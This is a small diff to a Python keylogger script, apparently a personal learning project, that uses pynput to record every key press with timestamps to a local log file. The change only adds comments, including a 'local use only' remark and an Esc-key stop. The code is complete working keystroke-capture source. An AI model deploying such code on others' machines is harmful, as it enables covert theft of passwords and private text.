@@ -2,16 +2,22 @@ import pynput
 from pynput.keyboard import Key, Listener
 import logging
 
+## This keylogger is only for local use only.
+
+# Specify the directory for log files
 log_dir = "C:/Users/jakeb/Keylogger/"
 
+# Log configurations
 logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
     logging.info(key)
 
+# Manual fail safe
 def on_release(key):
     if key == Key.esc:
         return False
 
+# With statement to try and catch the Listener that has press and release parameters
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
